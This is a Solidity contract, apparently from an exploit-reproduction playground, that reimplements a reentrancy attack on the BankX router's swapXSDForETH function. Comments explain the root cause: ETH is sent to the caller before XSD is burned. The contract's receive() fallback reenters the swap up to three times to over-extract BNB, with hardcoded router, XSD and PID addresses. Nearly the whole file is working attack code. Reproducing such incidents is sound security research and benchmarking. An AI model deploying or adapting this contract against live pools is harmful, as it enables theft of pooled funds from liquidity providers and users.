// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Synthetic standalone exploit for the EVM Playground (2025-02-BankX).
// The registry Foundry test (test/BankX_exp.sol) runs the attack INLINE on the
// test contract with `deal(XSD, …)`, PID.priceCheck(), and vm.roll(+block_delay).
// Capital is dealt via setup.dealToken; block_delay is zeroed and priceCheck is
// pranked via setup so run() can reenter swapXSDForETH without mid-tx rolls.
//
// Root cause (Router.swapXSDForETH):
//   1) transfer amountInMax XSD from user → pool
//   2) pool.swap → router receives WETH
//   3) WETH.withdraw + safeTransferETH(msg.sender)  ← external call BEFORE burn
//   4) XSD.burnpoolXSD(amountInMax/10)
// Reentering at (3) re-swaps against desynced pool state and over-extracts BNB.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IRouter {
    function swapXSDForETH(uint256 amountOut, uint256 amountInMax, uint256 deadline) external;
}

interface IPID {
    function priceCheck() external;
}

contract BankXDrain {
    address constant ROUTER = 0xaaDAE9117dF8b5d584378a41a105CC4862A16E99;
    address constant XSD = 0x39400E67820c88A9D67F4F9c1fbf86f3D688e9F6;
    address constant PID = 0xF441252DE7972B269cE954d82bE8b127a815Ecfb;

    uint256 reenterCount;
    uint256 constant MAX_REENTER = 3;
    bool attacking;
    uint256 amountOutPrimary = 5 ether;

    // Recorded attack. XSD is pre-dealt; block_delay forced to 0 and priceCheck
    // already done for this contract in setup (see 2025-02-BankX.mjs).
    function run() external {
        IERC20(XSD).approve(ROUTER, type(uint256).max);

        // Re-assert priceCheck in case setup was skipped on a fresh fork; with
        // block_delay=0 the same-block require passes immediately.
        try IPID(PID).priceCheck() {} catch {}

        uint256 amountInMax = 200_000 ether;
        attacking = true;
        IRouter(ROUTER).swapXSDForETH(amountOutPrimary, amountInMax, block.timestamp + 100);
        attacking = false;

        require(reenterCount > 0, "reentrancy did not fire");
        require(address(this).balance > amountOutPrimary, "did not over-extract BNB via reentrancy");
    }

    receive() external payable {
        if (!attacking || reenterCount >= MAX_REENTER) return;
        reenterCount++;
        // Reenter before outer setPriceCheck(false) runs.
        try IRouter(ROUTER).swapXSDForETH(2 ether, 200_000 ether, block.timestamp + 100) {} catch {}
    }
}
